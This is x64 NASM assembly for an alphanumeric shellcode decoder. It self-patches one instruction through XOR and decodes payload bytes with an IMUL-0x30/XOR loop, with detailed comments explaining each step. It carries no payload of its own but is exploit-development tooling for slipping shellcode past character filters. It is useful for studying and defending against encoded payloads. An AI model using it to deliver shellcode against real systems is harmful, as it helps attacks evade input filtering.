BITS 64

; Some complex math is needed to get static values in certain registers because
; there is no alphanumeric way to do it directly:
mult_code  equ 0x33333333               ; mult_code ^ mult_dword must be alphanumeric
mult_dword equ 0x05050503               ; mult_dword * mult_byte must result in 
mult_byte  equ 0x33                     ;                something negative close to 0
mult_value equ mult_dword * mult_byte   ; 0505,0503 * 33 = FFFF,FF99

; Some useful functions
%define B2W(b1,b2)                      (((b2) << 8) + (b1))
%define W2DW(w1,w2)                     (((w2) << 16) + (w1))
%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))

; Some opcodes must be hard-coded because they are XORed or get encoded in a non-
; alphanumeric way by default by NASM:
%define MOVSXD_RSI_xRCXx                db 0x48, 0x63, 0x31 ; MOVSXD RSI, [RCX]
%define INC_RSI_XOR_mult_value          dw B2W(0xFF, 0xC6) ^ mult_value ; INC RSI ^ mult_value
%define REX_W                           db 0x48             ; REX:W prefix for INC RSI

start:                                  ; ESP = $
    PUSH    RDI                         ; ESP = $+1, [$+1] = start
    PUSH    mult_dword^mult_code        ; ESP = $+2, [$+2] = mult_dword^mult_code
    PUSH    RSP                         ; ESP = $+3, [$+3] = $+2
    POP     RCX                         ; ESP = $+2, ECX = $+2
    XOR     [RCX], ESI                  ; [$+2] ^= ESI (==mult_dword^mult_code^ESI)
    XOR     ESI, [RCX]                  ; ESI ^= [$+2] (==mult_dword^mult_code^ESI^ESI==mult_dword^mult_code)
    POP     RAX                         ; ESP = $+1
    PUSH    mult_code                   ; ESP = $+2, [$+2] = mult_code
    XOR     [RCX], ESI                  ; [$+2] ^= ESI (==mult_code^mult_dword^mult_code==mult_dword)
    IMUL    ESI, [RCX], BYTE mult_byte  ; ESI = [$+2] * mult_byte (==mult_dword*mult_byte==mult_value)
    POP     RAX                         ; ESP = $+1
    PUSH    BYTE (esi_value & 0xFFFFFFFF) ^ mult_value ; ESP = $+2, [$+2] = esi_value^mult_value
    PUSH    RSI                         ; ESP = $+3, [$+3] = mult_value
    XOR     [RCX], ESI                  ; [$+2] ^= mult_value (==esi_value^mult_value^mult_value==esi_value)
    MOVSXD_RSI_xRCXx                    ; RSI = WORD [$+2] (==esi_value)
    POP     RDX                         ; ESP = $+2, EDX = mult_value
    POP     RAX                         ; ESP = $+1, EAX = esi_value
    POP     RCX                         ; ESP = $, ECX = start
    XOR     [BYTE RCX + 2*RSI + inc_marker - (esi_value*2)],DX ; [inc_marker] ^= mult_value (==INC RSI^mult_value^multvalue==INC RSI)
                                        ;                             |
esi_value equ -0x10 ; Found manually to result in alphanumeric code   |
                                        ;                             |
decode_loop:                            ;                             |
    REX_W                               ; REX:W for INC RSI           |
inc_marker:                             ;                             |
    INC_RSI_XOR_mult_value              ; <-- Patched using XOR ------'
    ; ESI starts at (esi_value) and gets incremented immediately and every time the
    ; decoder loops. So ESI will be (esi_value + X) where X = [1, 2, 3, ...]
    IMUL    EAX, [BYTE RCX + 2*RSI + (jnz_marker-start) + 1 - ((esi_value+1)*2)], BYTE 0x30
    ; EAX = [start + 2 * (esi_value + X) + (jnz_marker-start) + 1 - ((esi_value+1)*2)] * 0x30
    ;     = [jnz_marker + 2 * esi_value + 2 * X + 1 - 2 * esi_value - 2] * 0x30
    ;     = [jnz_marker + 2 * X - 1]
    ; The first data byte (X=1) is read from [jnz_marker + 1], then from +3, +5, +7, ...
    XOR     AL,  [BYTE RCX + 2*RSI + (jnz_marker-start) + 2 - ((esi_value+1)*2)]
    ; AL ^ = [start + 2 * (esi_value + X) + (jnz_marker-start) + 2 - ((esi_value+1)*2)]
    ;      = <snip> Similar calculation as above, except this ---^
    ;      = [jnz_marker + 2 * X]
    ; The second data byte (X=1) is read from [jnz_marker + 2], then from +4, +6, +8, ...
    ; AL == ([jnz_marker + 2 * X - 1] * 0x30) ^ [jnz_marker + 2 * X] == decoded byte ^ pre_xored_decoded_byte
    XOR     [BYTE RCX + RSI + (jnz_marker-start) + 1 - (esi_value+1)], AL
    ; [start + (esi_value + X) + (jnz_marker-start) + 1 - (esi_value+1) ^= decoded byte
    ; [jnz_marker + X] ^= pre_xored_decoded_byte
    ; The first decoded byte is written to [jnz_marker + 1], then to +2, +3, +4, ...
    ; The decoded bytes are "pre-xored" with the data bytes they overwrite so that
    ; XOR can be used to change the data bytes into the decoded original bytes.
    ; For more info goto http://skypher.com/wiki/index.php/IMUL_0x30_encoding
jnz_marker:
    ; The offset of the jump that closes the loop is negative and thus not
    ; alphanumeric. Because the decoder decodes one byte before it hits the
    ; jump we can encode the offset and let it be the first decoded byte.
    db      0x75                        ; JNZ -0x12 (75 EE)
    ; The decoded value must be "EE". Using "encode JMP offset.py" we can find
    ; out that the following two bytes encode this:
    db      0x33, 0x4D
